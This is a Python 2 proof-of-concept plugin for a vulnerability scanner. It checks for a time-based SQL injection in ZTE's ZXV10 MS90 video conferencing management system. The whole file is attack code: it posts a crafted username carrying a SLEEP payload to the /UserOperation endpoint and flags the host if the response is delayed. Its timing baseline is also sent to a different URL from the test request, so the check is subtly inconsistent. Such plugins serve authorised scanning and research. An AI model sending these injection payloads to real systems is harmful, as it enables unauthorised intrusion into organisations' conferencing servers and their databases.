# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'ZTE_0004'  # 平台漏洞编号，留空
    name = '中兴ZXV10 MS90视频会议管理系统通用SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        中兴ZXV10 MS90视频会议管理系统通用SQL注入漏洞。
        /UserOperation
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ZXV10_MS90'  # 漏洞应用名称
    product_version = '中兴ZXV10 MS90视频会议管理系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '14cf3c63-c2e7-43c0-8444-76417a9558d4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            data = "username=admin';(SELECT * FROM (SELECT(SLEEP(0)))gByI)#&op=getHint"
            code1, head, res, errcode, _ = hh.http(arg,data)
            true_time = time.time() - start_time1
            start_time2 = time.time()
            url = arg + '/UserOperation'
            data = "username=admin';(SELECT * FROM (SELECT(SLEEP(5)))gByI)#&op=getHint"
            code2, head, res, errcode, _ = hh.http(url ,data)
            flase_time = time.time() - start_time2

            if code1 == 200 and code2 == 200 and flase_time > 5 > true_time:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
